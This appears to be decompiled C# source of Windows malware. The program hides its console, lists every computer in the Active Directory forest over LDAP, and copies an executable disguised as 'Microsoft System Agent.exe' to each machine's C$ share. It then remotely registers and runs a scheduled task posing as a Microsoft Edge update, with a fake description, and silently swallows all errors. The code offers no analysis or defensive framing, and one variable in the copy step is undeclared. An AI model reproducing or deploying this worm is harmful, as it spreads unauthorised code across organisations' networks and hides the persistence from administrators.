using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x02000002 RID: 2
internal class Program
{
	// Token: 0x06000001 RID: 1
	[DllImport("Kernel32.dll")]
	private static extern bool FreeConsole();

	// Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
	private static void Main()
	{
		Program.FreeConsole();
		string path = "C:\\Users\\Public\\Microsoft System Agent.exe";
		try
		{
			string machineName = Environment.MachineName;
			foreach (object obj in Forest.GetCurrentForest().Domains)
			{
				Domain domain = (Domain)obj;
				string domain_perfix_name = "";
				if (domain.ToString().Contains("."))
				{
					domain_perfix_name = domain.ToString().Split(new char[] { '.' })[0];
				}
				else
				{
					domain_perfix_name = domain.ToString();
				}
				foreach (object computers in new DirectorySearcher(new DirectoryEntry("LDAP://" + domain.PdcRoleOwner.Name + "/DC=" + domain.Name.Replace(".", ",DC=")))
				{
					Filter = "(objectClass=computer)"
				}.FindAll())
				{
					SearchResult searchResult = (SearchResult)computers;
					if (searchResult.Properties.Contains("name"))
					{
						string computer_name = searchResult.Properties["name"][0].ToString();
						if (!string.Equals(computer_name, machineName, StringComparison.OrdinalIgnoreCase))
						{
							try
							{
								string path_for_implat = "\\\\" + computer_name + "\\C$\\Users\\Public\\Microsoft System Agent.exe";
								File.Copy(text, path_for_implat, true);
								if (File.Exists(path_for_implat))
								{
									string schedule_task_name = "MicrosoftEdgeUpdateTaskMachinesCores";
									try
									{
										object schedule_task_service_instance = Activator.CreateInstance(Type.GetTypeFromProgID("Schedule.Service"));
										if (Program.<>o__1.<>p__0 == null)
										{
											Program.<>o__1.<>p__0 = CallSite<Action<CallSite, object, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Connect", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
											}));
										}
										Program.<>o__1.<>p__0.Target(Program.<>o__1.<>p__0, schedule_task_service_instance, computer_name);
										if (Program.<>o__1.<>p__1 == null)
										{
											Program.<>o__1.<>p__1 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetFolder", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										object obj4 = Program.<>o__1.<>p__1.Target(Program.<>o__1.<>p__1, schedule_task_service_instance, "\\");
										if (Program.<>o__1.<>p__2 == null)
										{
											Program.<>o__1.<>p__2 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "NewTask", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										object obj5 = Program.<>o__1.<>p__2.Target(Program.<>o__1.<>p__2, schedule_task_service_instance, 0);
										if (Program.<>o__1.<>p__4 == null)
										{
											Program.<>o__1.<>p__4 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Description", typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Func<CallSite, object, string, object> target = Program.<>o__1.<>p__4.Target;
										CallSite <>p__ = Program.<>o__1.<>p__4;
										if (Program.<>o__1.<>p__3 == null)
										{
											Program.<>o__1.<>p__3 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "RegistrationInfo", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										target(<>p__, Program.<>o__1.<>p__3.Target(Program.<>o__1.<>p__3, obj5), "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.");
										if (Program.<>o__1.<>p__6 == null)
										{
											Program.<>o__1.<>p__6 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "GroupId", typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
											}));
										}
										Func<CallSite, object, string, object> target2 = Program.<>o__1.<>p__6.Target;
										CallSite <>p__2 = Program.<>o__1.<>p__6;
										if (Program.<>o__1.<>p__5 == null)
										{
											Program.<>o__1.<>p__5 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Principal", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										target2(<>p__2, Program.<>o__1.<>p__5.Target(Program.<>o__1.<>p__5, obj5), domain_perfix_name + "\\Domain Users");
										if (Program.<>o__1.<>p__8 == null)
										{
											Program.<>o__1.<>p__8 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "LogonType", typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Func<CallSite, object, int, object> target3 = Program.<>o__1.<>p__8.Target;
										CallSite <>p__3 = Program.<>o__1.<>p__8;
										if (Program.<>o__1.<>p__7 == null)
										{
											Program.<>o__1.<>p__7 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Principal", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										target3(<>p__3, Program.<>o__1.<>p__7.Target(Program.<>o__1.<>p__7, obj5), 5);
										if (Program.<>o__1.<>p__10 == null)
										{
											Program.<>o__1.<>p__10 = CallSite<Func<CallSite, object, bool, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "DisallowStartIfOnBatteries", typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Func<CallSite, object, bool, object> target4 = Program.<>o__1.<>p__10.Target;
										CallSite <>p__4 = Program.<>o__1.<>p__10;
										if (Program.<>o__1.<>p__9 == null)
										{
											Program.<>o__1.<>p__9 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Settings", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										target4(<>p__4, Program.<>o__1.<>p__9.Target(Program.<>o__1.<>p__9, obj5), false);
										if (Program.<>o__1.<>p__12 == null)
										{
											Program.<>o__1.<>p__12 = CallSite<Func<CallSite, object, bool, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "StopIfGoingOnBatteries", typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Func<CallSite, object, bool, object> target5 = Program.<>o__1.<>p__12.Target;
										CallSite <>p__5 = Program.<>o__1.<>p__12;
										if (Program.<>o__1.<>p__11 == null)
										{
											Program.<>o__1.<>p__11 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Settings", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										target5(<>p__5, Program.<>o__1.<>p__11.Target(Program.<>o__1.<>p__11, obj5), false);
										if (Program.<>o__1.<>p__13 == null)
										{
											Program.<>o__1.<>p__13 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Triggers", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										object obj6 = Program.<>o__1.<>p__13.Target(Program.<>o__1.<>p__13, obj5);
										if (Program.<>o__1.<>p__14 == null)
										{
											Program.<>o__1.<>p__14 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Create", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Program.<>o__1.<>p__14.Target(Program.<>o__1.<>p__14, obj6, 9);
										if (Program.<>o__1.<>p__15 == null)
										{
											Program.<>o__1.<>p__15 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Create", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Program.<>o__1.<>p__15.Target(Program.<>o__1.<>p__15, obj6, 7);
										if (Program.<>o__1.<>p__17 == null)
										{
											Program.<>o__1.<>p__17 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Create", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										Func<CallSite, object, int, object> target6 = Program.<>o__1.<>p__17.Target;
										CallSite <>p__6 = Program.<>o__1.<>p__17;
										if (Program.<>o__1.<>p__16 == null)
										{
											Program.<>o__1.<>p__16 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Actions", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										object obj7 = target6(<>p__6, Program.<>o__1.<>p__16.Target(Program.<>o__1.<>p__16, obj5), 0);
										if (Program.<>o__1.<>p__18 == null)
										{
											Program.<>o__1.<>p__18 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Path", typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
											}));
										}
										Program.<>o__1.<>p__18.Target(Program.<>o__1.<>p__18, obj7, path);
										if (Program.<>o__1.<>p__19 == null)
										{
											Program.<>o__1.<>p__19 = CallSite<Func<CallSite, object, string, object, int, object, object, int, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "RegisterTaskDefinition", null, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										object obj8 = Program.<>o__1.<>p__19.Target(Program.<>o__1.<>p__19, obj4, schedule_task_name, obj5, 6, null, null, 5, "");
										if (Program.<>o__1.<>p__21 == null)
										{
											Program.<>o__1.<>p__21 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
										}
										Func<CallSite, object, bool> target7 = Program.<>o__1.<>p__21.Target;
										CallSite <>p__7 = Program.<>o__1.<>p__21;
										if (Program.<>o__1.<>p__20 == null)
										{
											Program.<>o__1.<>p__20 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(Program), new CSharpArgumentInfo[]
											{
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
												CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
											}));
										}
										if (target7(<>p__7, Program.<>o__1.<>p__20.Target(Program.<>o__1.<>p__20, obj8, null)))
										{
											if (Program.<>o__1.<>p__24 == null)
											{
												Program.<>o__1.<>p__24 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
											}
											Func<CallSite, object, bool> target8 = Program.<>o__1.<>p__24.Target;
											CallSite <>p__8 = Program.<>o__1.<>p__24;
											if (Program.<>o__1.<>p__23 == null)
											{
												Program.<>o__1.<>p__23 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(Program), new CSharpArgumentInfo[]
												{
													CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
													CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
												}));
											}
											Func<CallSite, object, int, object> target9 = Program.<>o__1.<>p__23.Target;
											CallSite <>p__9 = Program.<>o__1.<>p__23;
											if (Program.<>o__1.<>p__22 == null)
											{
												Program.<>o__1.<>p__22 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "State", typeof(Program), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
											}
											if (target8(<>p__8, target9(<>p__9, Program.<>o__1.<>p__22.Target(Program.<>o__1.<>p__22, obj8), 4)))
											{
												if (Program.<>o__1.<>p__25 == null)
												{
													Program.<>o__1.<>p__25 = CallSite<Action<CallSite, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", null, typeof(Program), new CSharpArgumentInfo[]
													{
														CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
														CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
													}));
												}
												Program.<>o__1.<>p__25.Target(Program.<>o__1.<>p__25, obj8, null);
											}
										}
									}
									catch (Exception)
									{
									}
								}
							}
							catch (Exception)
							{
							}
						}
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
